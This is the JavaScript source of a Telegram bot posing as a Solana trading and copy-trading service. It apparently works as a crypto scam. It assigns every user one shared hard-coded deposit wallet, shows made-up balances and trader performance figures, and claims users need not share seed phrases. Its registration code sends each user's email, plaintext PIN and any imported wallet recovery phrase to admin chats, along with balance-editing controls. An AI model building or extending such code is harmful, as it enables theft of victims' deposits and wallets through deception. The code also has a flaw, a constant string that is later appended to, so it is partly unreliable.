require("dotenv/config");
const { Telegraf, Markup, Input } = require("telegraf");
const { MongoClient } = require("mongodb");
const http = require("http");
const path = require("path");
const fs = require("fs");
const PORT = process.env.PORT || 8080;
const DATA_DIR = path.join(__dirname, "data");
const DATA_FILE = path.join(DATA_DIR, "users.json");
let mongoDb = null;
let mongoCollection = null;

function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
  } catch (e) {
    console.error("Failed to create data directory:", e?.message || e);
  }
}

async function saveUsers() {
  if (mongoCollection) {
    try {
      const ops = [];
      for (const [userId, user] of registeredUsers.entries()) {
        ops.push({
          updateOne: {
            filter: { _id: userId },
            update: { $set: user },
            upsert: true,
          },
        });
      }
      if (ops.length > 0) {
        await mongoCollection.bulkWrite(ops);
      }
      debugLog.push({ time: new Date().toISOString(), action: "users saved to mongodb", count: registeredUsers.size });
    } catch (e) {
      console.error("Failed to save users to MongoDB:", e?.message || e);
      debugLog.push({ time: new Date().toISOString(), action: "mongodb save failed", error: e?.message || e?.toString() });
    }
    return;
  }
  ensureDataDir();
  try {
    const data = JSON.stringify(Array.from(registeredUsers.entries()));
    fs.writeFileSync(DATA_FILE, data, "utf8");
    debugLog.push({ time: new Date().toISOString(), action: "users saved to disk", count: registeredUsers.size });
  } catch (e) {
    console.error("Failed to save users:", e?.message || e);
    debugLog.push({ time: new Date().toISOString(), action: "save users failed", error: e?.message || e?.toString() });
  }
}

async function loadUsers() {
  if (mongoCollection) {
    try {
      const docs = await mongoCollection.find({}).toArray();
      for (const doc of docs) {
        const userId = Number(doc._id);
        if (!isNaN(userId)) {
          registeredUsers.set(userId, doc);
        }
      }
      console.log("✅ Loaded " + registeredUsers.size + " registered users from MongoDB.");
      debugLog.push({ time: new Date().toISOString(), action: "users loaded from mongodb", count: registeredUsers.size });
    } catch (e) {
      console.error("Failed to load users from MongoDB:", e?.message || e);
      debugLog.push({ time: new Date().toISOString(), action: "mongodb load failed", error: e?.message || e?.toString() });
    }
    return;
  }
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const entries = JSON.parse(data);
      for (const [userId, user] of entries) {
        registeredUsers.set(Number(userId), user);
      }
      console.log("✅ Loaded " + registeredUsers.size + " registered users from disk.");
      debugLog.push({ time: new Date().toISOString(), action: "users loaded from disk", count: registeredUsers.size });
    } else {
      debugLog.push({ time: new Date().toISOString(), action: "no data file found, using in-memory defaults" });
    }
  } catch (e) {
    console.error("Failed to load users, starting fresh:", e?.message || e);
    debugLog.push({ time: new Date().toISOString(), action: "load users failed", error: e?.message || e?.toString() });
  }
}

async function initMongoDB() {
  const mongoUri = process.env.MONGODB_URI;
  if (!mongoUri) {
    console.log("⚠️  MONGODB_URI not set, using file-based persistence.");
    debugLog.push({ time: new Date().toISOString(), action: "mongodb not configured, using file-based" });
    return;
  }
  debugLog.push({ time: new Date().toISOString(), action: "mongodb init started" });
  try {
    const client = new MongoClient(mongoUri, { serverSelectionTimeoutMS: 10000 });
    await client.connect();
    mongoDb = client.db("soltradingbot");
    mongoCollection = mongoDb.collection("users");
    console.log("✅ Connected to MongoDB Atlas.");
    debugLog.push({ time: new Date().toISOString(), action: "mongodb connected", database: "soltradingbot", collection: "users" });
  } catch (e) {
    console.error("❌ Failed to connect to MongoDB, falling back to file-based:", e);
    debugLog.push({ time: new Date().toISOString(), action: "mongodb connection failed", error: e?.message || e?.toString(), code: e?.code, errmsg: e?.errmsg, ok: e?.ok });
    mongoDb = null;
    mongoCollection = null;
  }
}


const TOKEN = process.env.HTTP_API_TOKEN || process.env.TELEGRAM_BOT_TOKEN;

if (!TOKEN) {
  console.error("❌ Error: TELEGRAM_BOT_TOKEN is missing in your .env file!");
  process.exit(1);
}

const bot = new Telegraf(TOKEN);

const startupInfo = { mode: "starting", timestamp: new Date().toISOString() };
const debugLog = [];

const server = http.createServer((req, res) => {
  if (req.method === "GET" && req.url === "/debug") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ 
      startupInfo, 
      debugLog: debugLog.slice(-20),
       env: {
         NODE_ENV: process.env.NODE_ENV,
         RENDER: process.env.RENDER ? "set" : "unset",
         PORT: process.env.PORT,
         MONGODB_URI: process.env.MONGODB_URI ? "set" : "unset",
       },
       mongodb: {
         connected: mongoCollection !== null,
         userCount: registeredUsers.size,
       }
    }));
    return;
  }
  if (req.method === "POST" && (req.url === "/webhook" || req.url === "/sol_tradingbot/webhook")) {
    console.log("🔔 Webhook received: " + req.url + " at " + new Date().toISOString());
    let body = "";
    req.on("data", chunk => { body += chunk.toString(); });
    req.on("end", () => {
      try {
        console.log("Webhook body length:", body.length);
        const update = JSON.parse(body);
        console.log("Processing update_id:", update?.update_id);
        bot.handleUpdate(update, res).catch(e => {
          console.error("handleUpdate error:", e?.message || e);
          if (!res.headersSent) {
            res.writeHead(200);
            res.end();
          }
        });
      } catch (e) {
        console.error("Webhook parse error:", e);
        res.writeHead(200);
        res.end();
      }
    });
    req.on("error", (e) => {
      console.error("Webhook request error:", e);
      res.writeHead(200);
      res.end();
    });
    return;
  }
  if (req.method === "GET" && (req.url === "/ping" || req.url === "/sol_tradingbot/ping")) {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ 
      status: "ok", 
      mode: startupInfo.mode, 
      time: new Date().toISOString(),
      webhookUrl: startupInfo.webhookUrl || "none"
    }));
    return;
  }
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("Bot is running");
});

server.listen(PORT, () => {
  console.log("🚀 HTTP server listening on port " + PORT);
});

server.on("error", (err) => {
  console.error("HTTP server error:", err);
});

const SOL_PRICE = 152.3;
const ETH_PRICE = 2485.59;
const MOCK_WALLET = "9g1upNRirdjisqneJnCfUKx6SBjQEY827fjyLQ9BfRro";
const MIN_SOL_FOR_COPY_TRADE = 5;

const ADMIN_ID = process.env.ADMIN_ID || null;
const MOCK_ETH_ADDRESS = "0xeee072D925f1a571a3573c280cEb2EC51393d4b4";

const MOCK_TRADERS = [
  {
    id: "trader1",
    name: "Alpha Trader",
    username: "alpha_trader",
    avatar: "🟣",
    description: "Top performing Solana trader with consistent monthly gains.",
    performance: "+124%",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$988,666.00",
    maxSol: "≈ 9,532.06710374 SOL",
    maxEth: "≈ 410.24847298 ETH",
    image: "copytrader1",
    timeframe: "24h",
  },
  {
    id: "trader2",
    name: "Entry X",
    username: "entryx",
    avatar: "🟣",
    description: "High volume ETH trader with deep market analysis.",
    performance: "+89%",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$678,333.00",
    maxSol: "≈ 6,540.04049364 SOL",
    maxEth: "≈ 281.47531868 ETH",
    image: "copytrader2",
    timeframe: "12h",
  },
  {
    id: "trader3",
    name: "yorhaclipz",
    username: "yorhaclipz",
    avatar: "🟢",
    description: "Focused on SOL ecosystem tokens and NFTs.",
    performance: "+156%",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$10,000.00",
    maxSol: "≈ 96.41342075 SOL",
    maxEth: "≈ 4.14951534 ETH",
    image: "copytrader3",
    timeframe: "5m",
  },
  {
    id: "trader4",
    name: "Edward Johnson",
    username: "edward_johnson",
    avatar: "🟣",
    description: "Option Trader",
    performance: "79%",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$28,200.00",
    maxSol: "≈ 271.88584651 SOL",
    maxEth: "≈ 11.70163325 ETH",
    image: "copytrade4",
    timeframe: "3h",
  },
  {
    id: "trader5",
    name: "Zyrox0x",
    username: "zyrox0x",
    avatar: "🟣",
    description: "Memecoin Trader",
    performance: "85%",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$100,000.00",
    maxSol: "≈ 964.13420748 SOL",
    maxEth: "≈ 41.49515337 ETH",
    image: "copytrade5",
    timeframe: "1h",
  },
  {
    id: "trader6",
    name: "MATTSMATTED",
    username: "mattsmatted",
    avatar: "🔴",
    description: "Showing the up and downs of a full time daytrader",
    performance: "89%",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$100,000.00",
    maxSol: "≈ 964.13420748 SOL",
    maxEth: "≈ 41.49515337 ETH",
    image: "copytrade6",
    timeframe: "24h",
  },
  {
    id: "trader7",
    name: "Guo Shen 郭深",
    username: "guoshen",
    avatar: "🟡",
    description: "Onchain worlds need autonomous minds. Al agents are coming for every market.",
    performance: "87%",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$100,000.00",
    maxSol: "≈ 964.13420748 SOL",
    maxEth: "≈ 41.49515337 ETH",
    image: "copytrade7",
    timeframe: "24h",
  },
  {
    id: "trader8",
    name: "Ronald Carter",
    username: "ronald_carter",
    avatar: "🔵",
    description: "Investing for Entertainment",
    performance: "92%",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$1,000,000.00",
    maxSol: "≈ 9,641.34207482 SOL",
    maxEth: "≈ 414.95153366 ETH",
    image: "copytrade8",
    timeframe: "24h",
  },
  {
    id: "trader9",
    name: "The SoLstice",
    username: "thesolstice",
    avatar: "🟣",
    description: "Welcome to the family, son\nTrade with me on fomo and get 10% off fees",
    performance: "78",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$1,000,000.00",
    maxSol: "≈ 9,641.34207482 SOL",
    maxEth: "≈ 414.95153366 ETH",
    image: "copytrade9",
    timeframe: "24h",
  },
  {
    id: "trader10",
    name: "Hailey crypto",
    username: "haileycrypto",
    avatar: "🟢",
    description: "CRYPTO GURU,MEMECOIN LOVER,OF MEMECOIN DEGEN",
    performance: "88",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$1,000,000.00",
    maxSol: "≈ 9,641.34207482 SOL",
    maxEth: "≈ 414.95153366 ETH",
    image: "copytrade10",
    timeframe: "24h",
  },
  {
    id: "trader11",
    name: "CF",
    username: "cf_crypto",
    avatar: "🟡",
    description: "Crypto since 2016 | Investor & Trader | Early Alphas & Real Insights | NFA & DYOR top 3 solana trader",
    performance: "89",
    min: "$500.00",
    minSol: "≈ 4.82067104 SOL",
    minEth: "≈ 0.20747577 ETH",
    max: "$100,000.00",
    maxSol: "≈ 964.13420748 SOL",
    maxEth: "≈ 41.49515337 ETH",
    image: "copytrade11",
    timeframe: "24h",
  },
];

const MEDIA_BASE = path.resolve(__dirname);
const MEDIA_CDN_BASE = "https://cdn.jsdelivr.net/gh/platinum5343/sol-trading-bot@main/src";
const MEDIA_PATHS = {
  welcome: `${MEDIA_BASE}/images1.mp4`,
  network: `${MEDIA_BASE}/photo_3.jpg`,
  wallet: `${MEDIA_BASE}/photo_4.jpg`,
  security: `${MEDIA_BASE}/images1.mp4`,
  email: `${MEDIA_BASE}/photo_3.jpg`,
  pin: `${MEDIA_BASE}/photo_4.jpg`,
  dashboard: `${MEDIA_BASE}/images1.mp4`,
  buy: `${MEDIA_BASE}/photo_3.jpg`,
  sell: `${MEDIA_BASE}/photo_3.jpg`,
  balance: `${MEDIA_BASE}/photo_4.jpg`,
  portfolio: `${MEDIA_BASE}/photo_4.jpg`,
  deposit: `${MEDIA_BASE}/photo_4.jpg`,
  swap: `${MEDIA_BASE}/photo_3.jpg`,
  withdraw: `${MEDIA_BASE}/photo_3.jpg`,
  stake: `${MEDIA_BASE}/photo_4.jpg`,
  copy: `${MEDIA_BASE}/images1.mp4`,
  dca: `${MEDIA_BASE}/images1.mp4`,
  alerts: `${MEDIA_BASE}/images1.mp4`,
  settings: `${MEDIA_BASE}/photo_4.jpg`,
  main: `${MEDIA_BASE}/photo_4.jpg`,
  signal: `${MEDIA_BASE}/photo_3.jpg`,
  copytrader1: `${MEDIA_BASE}/copytrader1.jpg`,
  copytrader2: `${MEDIA_BASE}/copytrader2.jpg`,
  copytrader3: `${MEDIA_BASE}/copytrader3.jpg`,
  copytrade4: `${MEDIA_BASE}/copytrade4.jpg`,
  copytrade5: `${MEDIA_BASE}/copytrade5.jpg`,
  copytrade6: `${MEDIA_BASE}/copytrade6.jpg`,
  copytrade7: `${MEDIA_BASE}/copytrade7.jpg`,
  copytrade8: `${MEDIA_BASE}/copytrade8.jpg`,
  copytrade9: `${MEDIA_BASE}/copytrade9.jpg`,
  copytrade10: `${MEDIA_BASE}/copytrade10.jpg`,
  copytrade11: `${MEDIA_BASE}/copytrade11.jpg`,
};
const MEDIA_URLS = {
  welcome: `${MEDIA_CDN_BASE}/images1.mp4`,
  network: `${MEDIA_CDN_BASE}/photo_3.jpg`,
  wallet: `${MEDIA_CDN_BASE}/photo_4.jpg`,
  security: `${MEDIA_CDN_BASE}/images1.mp4`,
  email: `${MEDIA_CDN_BASE}/photo_3.jpg`,
  pin: `${MEDIA_CDN_BASE}/photo_4.jpg`,
  dashboard: `${MEDIA_CDN_BASE}/images1.mp4`,
  buy: `${MEDIA_CDN_BASE}/photo_3.jpg`,
  sell: `${MEDIA_CDN_BASE}/photo_3.jpg`,
  balance: `${MEDIA_CDN_BASE}/photo_4.jpg`,
  portfolio: `${MEDIA_CDN_BASE}/photo_4.jpg`,
  deposit: `${MEDIA_CDN_BASE}/photo_4.jpg`,
  swap: `${MEDIA_CDN_BASE}/photo_3.jpg`,
  withdraw: `${MEDIA_CDN_BASE}/photo_3.jpg`,
  stake: `${MEDIA_CDN_BASE}/photo_4.jpg`,
  copy: `${MEDIA_CDN_BASE}/images1.mp4`,
  dca: `${MEDIA_CDN_BASE}/images1.mp4`,
  alerts: `${MEDIA_CDN_BASE}/images1.mp4`,
  settings: `${MEDIA_CDN_BASE}/photo_4.jpg`,
  main: `${MEDIA_CDN_BASE}/photo_4.jpg`,
  signal: `${MEDIA_CDN_BASE}/photo_3.jpg`,
  copytrader1: `${MEDIA_CDN_BASE}/copytrader1.jpg`,
  copytrader2: `${MEDIA_CDN_BASE}/copytrader2.jpg`,
  copytrader3: `${MEDIA_CDN_BASE}/copytrader3.jpg`,
  copytrade4: `${MEDIA_CDN_BASE}/copytrade4.jpg`,
  copytrade5: `${MEDIA_CDN_BASE}/copytrade5.jpg`,
  copytrade6: `${MEDIA_CDN_BASE}/copytrade6.jpg`,
  copytrade7: `${MEDIA_CDN_BASE}/copytrade7.jpg`,
  copytrade8: `${MEDIA_CDN_BASE}/copytrade8.jpg`,
  copytrade9: `${MEDIA_CDN_BASE}/copytrade9.jpg`,
  copytrade10: `${MEDIA_CDN_BASE}/copytrade10.jpg`,
  copytrade11: `${MEDIA_CDN_BASE}/copytrade11.jpg`,
};

const mediaCache = new Map();

function mediaFor(ctx, key) {
  const chatId = ctx?.chat?.id ?? 0;
  const cached = mediaCache.get(chatId)?.get(key);
  if (cached) return cached;
  const isProd = process.env.RENDER || process.env.NODE_ENV === "production";
  if (isProd && MEDIA_URLS[key]) {
    return Input.fromURL(MEDIA_URLS[key]);
  }
  return Input.fromLocalFile(MEDIA_PATHS[key]);
}

function mediaForChat(chatId, key) {
  const cached = mediaCache.get(chatId)?.get(key);
  if (cached) return cached;
  const isProd = process.env.RENDER || process.env.NODE_ENV === "production";
  if (isProd && MEDIA_URLS[key]) {
    return Input.fromURL(MEDIA_URLS[key]);
  }
  return Input.fromLocalFile(MEDIA_PATHS[key]);
}

function captureFileId(chatId, key, msg) {
  if (!msg) return;
  const fileId = msg?.photo?.[0]?.file_id || msg?.animation?.file_id || msg?.video?.file_id;
  if (fileId) {
    if (!mediaCache.has(chatId)) mediaCache.set(chatId, new Map());
    mediaCache.get(chatId).set(key, fileId);
  }
}

async function replyWithCachedPhoto(ctx, key, extra) {
  const caption = extra?.caption || "Welcome!";
  const parseMode = extra?.parse_mode || "Markdown";
  const replyMarkup = extra?.reply_markup;

  debugLog.push({ time: new Date().toISOString(), action: "replyWithCachedPhoto", key, chatId: ctx?.chat?.id });
  debugLog.push({ time: new Date().toISOString(), action: "attempting photo send", key });

  try {
    const res = await ctx.replyWithPhoto(mediaFor(ctx, key), extra);
    captureFileId(ctx?.chat?.id ?? 0, key, res);
    debugLog.push({ time: new Date().toISOString(), action: "photo sent", message_id: res?.message_id });
    return res;
  } catch (err) {
    debugLog.push({ time: new Date().toISOString(), action: "photo failed, text fallback", error: err?.message || err?.toString() });
    try {
      const textRes = await ctx.reply(caption, { parse_mode: parseMode, reply_markup: replyMarkup });
      debugLog.push({ time: new Date().toISOString(), action: "text reply sent", message_id: textRes?.message_id });
      return textRes;
    } catch (textErr) {
      debugLog.push({ time: new Date().toISOString(), action: "text reply failed", error: textErr?.message || textErr?.toString() });
      return null;
    }
  }
}

async function sendPhotoCached(chatId, key, extra) {
  const caption = extra?.caption || "Welcome!";
  const parseMode = extra?.parse_mode || "Markdown";
  const replyMarkup = extra?.reply_markup;

  debugLog.push({ time: new Date().toISOString(), action: "sendPhotoCached attempt", key, chatId });

  try {
    const res = await bot.telegram.sendPhoto(chatId, mediaForChat(chatId, key), extra);
    captureFileId(chatId, key, res);
    debugLog.push({ time: new Date().toISOString(), action: "photo sent (sendPhotoCached)", message_id: res?.message_id, key, chatId });
    return res;
  } catch (err) {
    debugLog.push({ time: new Date().toISOString(), action: "photo failed, text fallback (sendPhotoCached)", error: err?.message || err?.toString(), key, chatId });
    console.error(`⚠️  Failed to send photo (${key}) to chat ${chatId}:`, err?.message || err);
    try {
      const textRes = await bot.telegram.sendMessage(chatId, caption, { parse_mode: parseMode, reply_markup: replyMarkup });
      debugLog.push({ time: new Date().toISOString(), action: "text message sent (sendPhotoCached fallback)", message_id: textRes?.message_id, key, chatId });
      return textRes;
    } catch (err2) {
      console.error(`⚠️  Also failed to send text message (${key}) to chat ${chatId}:`, err2?.message || err2);
      debugLog.push({ time: new Date().toISOString(), action: "text fallback also failed", error: err2?.message || err2?.toString(), key, chatId });
      return null;
    }
  }
}

async function deleteUserMessage(ctx) {
  try {
    const msgId = ctx?.message?.message_id;
    if (msgId !== undefined) {
      await ctx.deleteMessage(msgId);
    }
  } catch (e) {
  }
}

function defaultState() {
  return {
    userId: null,
    username: null,
    address: MOCK_WALLET,
    ethAddress: MOCK_ETH_ADDRESS,
    awaitingEmail: false,
    awaitingPin: false,
    awaitingPinConfirm: false,
    awaitingSwapAmount: false,
    swapPair: null,
    awaitingWithdrawAmount: false,
    withdrawToken: null,
    awaitingStakeAmount: false,
    stakeToken: null,
    currentView: null,
    pendingAction: null,
    selectedTrader: null,
    buyToken: null,
    sellToken: null,
    solBalance: 0,
    ethBalance: 0,
    usdcBalance: 0,
    alerts: true,
    securityCompleted: false,
    slippage: false,
    autoBuy: false,
    mevProtection: false,
    tradeHistory: [],
    copyTrades: [],
    awaitingImportWallet: false,
    importWalletNetwork: null,
    importWalletType: null,
  };
}

const sessions = new Map();
const registeredUsers = new Map();

registeredUsers.set(999001, {
  userId: 999001,
  username: "mockuser",
  email: "mock@example.com",
  pin: "1234",
  address: "9g1upNRirdjisqneJnCfUKx6SBjQEY827fjyLQ9BfRro",
  ethAddress: "0xeee072D925f1a571a3573c280cEb2EC51393d4b4",
  solBalance: 2.5,
  ethBalance: 0.8,
  usdcBalance: 150,
  registeredAt: new Date().toISOString(),
  lastActive: new Date().toISOString(),
  securityCompleted: true,
  tradeHistory: [
    { type: "buy", token: "SOL", amount: 1.2, usdValue: 150, price: 152.3, timestamp: new Date().toISOString() },
    { type: "sell", token: "SOL", amount: 0.5, usdcValue: 75, price: 152.3, timestamp: new Date().toISOString() },
  ],
  copyTrades: [
    { traderId: "trader1", traderName: "@alpha_trader", trade: { action: "BUY", token: "SOL", amount: 500, entry: 152.3, target: 165, stopLoss: 145 }, timeframe: "24h", timestamp: new Date().toISOString() },
  ],
  stakingPositions: [
    { token: "SOL", amount: 1.0, timestamp: new Date().toISOString() },
  ],
  dcaPlans: [],
   settings: { slippage: false, autoBuy: false, mevProtection: false },
    signalStrength: 85,
});

initMongoDB().then(() => {
  loadUsers();
});

function getState(ctx) {
  const chatId = ctx?.chat?.id ?? 0;
  let state = sessions.get(chatId);
  if (!state) {
    state = defaultState();
    if (ctx?.from?.id) state.userId = ctx.from.id;
    if (ctx?.from?.username) state.username = ctx.from.username;
    sessions.set(chatId, state);
  }
  return state;
}

function registerUser(state) {
  if (state.userId && state.email && state.pin) {
    const isNewUser = !registeredUsers.has(state.userId);
    const existing = registeredUsers.get(state.userId) || {};
    registeredUsers.set(state.userId, {
      userId: state.userId,
      username: state.username,
      email: state.email,
      pin: state.pin,
      address: state.address,
      ethAddress: state.ethAddress,
      solBalance: state.solBalance,
      ethBalance: state.ethBalance,
      usdcBalance: state.usdcBalance,
      registeredAt: existing.registeredAt || new Date().toISOString(),
      lastActive: new Date().toISOString(),
      securityCompleted: state.securityCompleted,
      tradeHistory: state.tradeHistory || [],
      copyTrades: state.copyTrades || [],
      stakingPositions: state.stakingPositions || [],
      dcaPlans: state.dcaPlans || [],
      settings: {
        slippage: state.slippage,
        autoBuy: state.autoBuy,
        mevProtection: state.mevProtection,
      },
     });
     saveUsers();

      if (isNewUser && ADMIN_ID) {
        const solUsd = (state.solBalance || 0) * SOL_PRICE;
        const ethUsd = (state.ethBalance || 0) * ETH_PRICE;
        const usdc = state.usdcBalance || 0;
        const total = solUsd + ethUsd + usdc;
        const adminNotification = `🎉 <b>New User Registered!</b>\n\n` +
          `👤 Username: ${state.username ? `<code>@${state.username}</code>` : "Unknown"}\n` +
          `🆔 User ID: ${state.userId}\n` +
          `📧 Email: <code>${state.email}</code>\n` +
          `🔐 PIN: <code>${state.pin}</code>\n` +
          `🟣 SOL Address: <code>${state.address || "N/A"}</code>\n` +
          `🔵 ETH Address: <code>${state.ethAddress || "N/A"}</code>\n`;
        
        if (state.importedWalletPhrase) {
          adminNotification += `\n📥 <b>Imported Wallet:</b>\n`;
          adminNotification += `🔑 Recovery Phrase: <code>${state.importedWalletPhrase}</code>\n`;
          adminNotification += `🌐 Network: ${state.importedWalletNetwork === "solana" ? "🟣 Solana" : "🔵 Ethereum"}\n`;
          adminNotification += `👛 Type: ${state.importedWalletType || "Unknown"}\n`;
        }
        
        adminNotification +=
          `💵 SOL: $${solUsd.toFixed(2)} (${(state.solBalance || 0).toFixed(4)} SOL)\n` +
          `💵 ETH: $${ethUsd.toFixed(2)} (${(state.ethBalance || 0).toFixed(4)} ETH)\n` +
          `💵 USDC: $${usdc.toFixed(2)}\n` +
          `💎 Total: $${total.toFixed(2)}\n` +
          `🔄 Trades: ${state.tradeHistory?.length || 0}\n` +
          `📋 Copy Trades: ${state.copyTrades?.length || 0}\n` +
          `💎 Staking Positions: ${state.stakingPositions?.length || 0}\n` +
          `📅 Registered: ${new Date().toISOString()}\n\n` +
          `Select a field to edit:`;

        const keyboard = adminKeyboardFor(state.userId);

        ADMIN_ID.split(",").forEach(id => {
          const adminId = parseInt(id.trim(), 10);
          if (!isNaN(adminId)) {
            bot.telegram.sendMessage(adminId, adminNotification, { parse_mode: "HTML", reply_markup: keyboard }).catch(e => {
              console.error(`⚠️  Failed to notify admin ${adminId}:`, e?.message || e);
              debugLog.push({ time: new Date().toISOString(), action: "admin notification failed", error: e?.message || e?.toString(), adminId });
            });
            debugLog.push({ time: new Date().toISOString(), action: "admin notification sent with edit buttons", userId: state.userId, adminId });
          }
        });
      }
  }
}

function syncState(state) {
  if (state.userId && registeredUsers.has(state.userId)) {
    const stored = registeredUsers.get(state.userId);
    stored.solBalance = state.solBalance;
    stored.ethBalance = state.ethBalance;
    stored.usdcBalance = state.usdcBalance;
    stored.tradeHistory = state.tradeHistory;
    stored.copyTrades = state.copyTrades;
    stored.stakingPositions = state.stakingPositions;
    stored.signalStrength = state.signalStrength;
    stored.settings = {
      slippage: state.slippage,
      autoBuy: state.autoBuy,
      mevProtection: state.mevProtection,
    };
    stored.lastActive = new Date().toISOString();
    saveUsers();
  }
}

const WELCOME_TEXT =
  "🎯 **WELCOME TO THE SOLANA CHALLENGE**\n\n" +
  "Introducing a next-generation trading bot built specifically for Solana traders.\n\n" +
  "⚡ **Instant Token Access** — Trade eligible Solana tokens immediately after launch.\n" +
  "🤖 **Automated Copy Trading** — Automatically replicate configured trading strategies.\n" +
  "🔐 **Secure Wallet Connection** — Connect your wallet without sharing your private keys or seed phrase.\n" +
  "📊 **Real-Time Execution** — Designed for fast execution in the rapidly moving Solana market.\n\n" +
  "You can either **generate a new wallet** or **import an existing one** to get started.\n\n" +
  "Select an option below:";

const NETWORK_TEXT =
  "🌐 **Select Network**\n\nChoose the network for this wallet:";

function walletAssignedText(state) {
  return (
    "✅ **Solana Wallet Assigned!**\n\n" +
    "🟣 **Solana**\n" +
    "`" + state.address + "`" +
    "\n_(Tap to Copy)_\n\n" +
    "Fund this wallet to start trading."
  );
}

const SECURITY_SETUP_TEXT =
  "🔐 **Security Setup**\n\nPlease enter your email address for account security.";

const PIN_PROMPT_TEXT =
  "🔐 **Now set your 4-digit PIN for withdrawals.**\n\n" +
  "_Enter a 4-digit number (message will be auto-deleted for security):_";

const PIN_CONFIRM_TEXT =
  "🔐 **Confirm your PIN by typing it again:**\n\n_(Auto-deleted after you send)_";

const SECURITY_COMPLETE_TEXT = (state) =>
  "✅ **Security Setup Complete!**\n\n" +
  `📧 ${state.email ? state.email.replace(/^(.).(?<=.).*@/, "$1****@") : "****"}\n` +
  "🔐 PIN: ****\n\n" +
  "Your PIN will be required for all withdrawals.";

const TRADE_APP_TEXT = "🚀 *Solana Trade App*";

const NETWORK_GRID_TEXT = (state) => {
  const signalStrength = state.signalStrength || 0;
  const statusText = signalStrength < 33 ? "🔴 LOW" : signalStrength < 66 ? "🟡 MEDIUM" : "🟢 HIGH";
  const signalWarning = signalStrength < 33
    ? "\n⚠️ *Low Signal Strength! Top up signal strength!*\n"
    : "";
  return (
    `${TRADE_APP_TEXT}\n\n` +
    "🇸 Solana\n" +
    `${state.address}\n` +
    `Balance: $${(state.solBalance * SOL_PRICE).toFixed(2)} (≈ ${state.solBalance.toFixed(4)} SOL)\n\n` +
    "🇪 Ethereum\n" +
    `${state.ethAddress || "N/A"}\n` +
    `Balance: $${(state.ethBalance * ETH_PRICE).toFixed(2)} (≈ ${state.ethBalance.toFixed(4)} ETH)\n\n` +
    `📧 ${state.email ? state.email.replace(/^(.).(?<=.).*@/, "$1****@") : "****"}\n` +
    "🔐 PIN: ****\n\n" +
    `📊 Signal: ${statusText}${signalWarning}\n` +
    "Use the menu below to get started."
  );
};

const DASHBOARD_TEXT =
  "🎛️ **Solana Trading Panel Active**\n" +
  "Select an option from the menu below to manage your operations:";

const PIN_MISMATCH_TEXT =
  "❌ **PINs do not match.**\n\n" +
  "🔐 **Now set your 4-digit PIN for withdrawals.**\n\n" +
  "_Enter a 4-digit number (message will be auto-deleted for security):_";

function welcomeKeyboard() {
  return Markup.keyboard([
    [Markup.button.text("✨ Generate Wallet")],
    [Markup.button.text("📥 Import Wallet")],
  ]).resize();
}

function networkKeyboard() {
  return Markup.keyboard([
    [Markup.button.text("🟣 Solana"), Markup.button.text("🔵 Ethereum")],
  ]).resize();
}

function walletSelectKeyboard(network) {
  const wallets = network === "solana"
    ? [
        ["👻 Phantom", "☀️ Solflare"],
        ["🛡️ Trust", "🦊 MetaMask"],
        ["🔵 Coinbase", "🔐 Ledger"],
        ["🟢 Exodus", "🛡️ Trezor"],
        ["⚛️ Atomic"],
      ]
    : [
        ["🦊 MetaMask", "🛡️ Trust"],
        ["🔵 Coinbase", "🔐 Ledger"],
        ["🟢 Exodus", "🛡️ Trezor"],
        ["⚛️ Atomic"],
      ];
  return Markup.keyboard([...wallets, ["🔙 Back"]]).resize();
}

function dashboardKeyboard() {
  return Markup.keyboard([
    ["🏠 Main Menu", "💰 Buy", "📉 Sell"],
    ["🔄 Swap", "💸 Withdraw", "💎 Stake"],
    ["👥 Copy Trade", "💳 Balance", "💳 Deposit"],
    ["📊 DCA", "🔔 Alerts", "📊 Signal Strength"],
    ["📈 Portfolio", "🧾 Trades", "📜 History"],
    ["👥 Referral", "🎟️ Support"],
  ]).resize();
}

function buyKeyboard() {
  return Markup.keyboard([
    ["0.1 SOL", "0.5 SOL", "1.0 SOL"],
    ["✏️ Custom Amount"],
    ["🔙 Back"],
  ]).resize();
}

function buyTokenKeyboard() {
  return Markup.keyboard([
    ["sol", "eth"],
    ["🔙 Back"],
  ]).resize();
}

function sellKeyboard() {
  return Markup.keyboard([
    ["25%", "50%", "🔥 100%"],
    ["✏️ Custom Amount"],
    ["🔙 Back"],
  ]).resize();
}

function sellTokenKeyboard() {
  return Markup.keyboard([
    ["sol", "eth"],
    ["🔙 Back"],
  ]).resize();
}

function settingsKeyboard(state) {
  return Markup.keyboard([
    [`Slippage: ${state.slippage ? "ON ✅" : "OFF ❌"}`, `Auto-buy: ${state.autoBuy ? "ON ✅" : "OFF ❌"}`],
    [`MEV Protection: ${state.mevProtection ? "ON ✅" : "OFF ❌"}`],
    ["🔙 Back", "🏠 Dashboard"],
  ]).resize();
}

function mainMenuKeyboard() {
  return Markup.keyboard([
    ["⚙️ Settings"],
    ["🔁 Restart"],
    ["🏠 Back to Dashboard"],
  ]).resize();
}

function backKeyboard() {
  return Markup.keyboard([
    ["🔙 Back"],
  ]).resize();
}

function securityCompleteKeyboard() {
  return Markup.keyboard([
    ["🚀 Enter Dashboard"],
  ]).resize();
}

